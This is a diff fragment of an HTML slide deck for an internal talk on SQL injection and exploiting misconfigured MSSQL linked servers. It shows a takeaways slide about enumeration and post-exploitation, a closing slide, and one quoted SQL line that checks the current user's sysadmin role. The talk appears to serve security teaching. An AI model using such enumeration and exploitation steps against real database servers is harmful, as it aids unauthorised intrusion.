+                        <li>Linked servers are common and often misconfigured</li>
+                        <li>Understanding SQL injection context is critical</li>
+                        <li>Post-exploitation tools provide more reliable access</li>
+                        <li>Always enumerate thoroughly before exploitation</li>
+                    </ul>
+                </div>
+                <div style="margin-top: 50px; font-size: 28px; color: #ffd700;">
+                    <strong>Remember:</strong> Trust but verify!
+                </div>
+            </div>
+        </div>
+
+        <!---->
+        <div class="slide" data-slide="">
+            <div class="center-content">
+                <div class="big-title" style="font-size: 72px;">Thank You!</div>
+                <div style="font-size: 32px; color: #888; margin-top: 30px;">
+                    Questions?
+                </div>
+                <div style="margin-top: 60px; font-size: 20px; color: #666;">
+                    <p style="margin-top: 15px;">Author: Kevin Carroll</p>
+                </div>
+                <div style="margin-top: 50px; font-size: 18px; color: #d4af37;">
+                    Coffee & Share Session
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="slide-counter">
         <span id="current-slide">1</span> / <span id="total-slides">15</span>
     </div>
 
@@ -609,5 +949,4 @@ SELECT current_user; SELECT IS_SRVROLEMEMBER('sysadmin') AS IsSysadmin; EXEC sp_
 
         showSlide(currentSlide);
     </script>
-</body>
 </body>
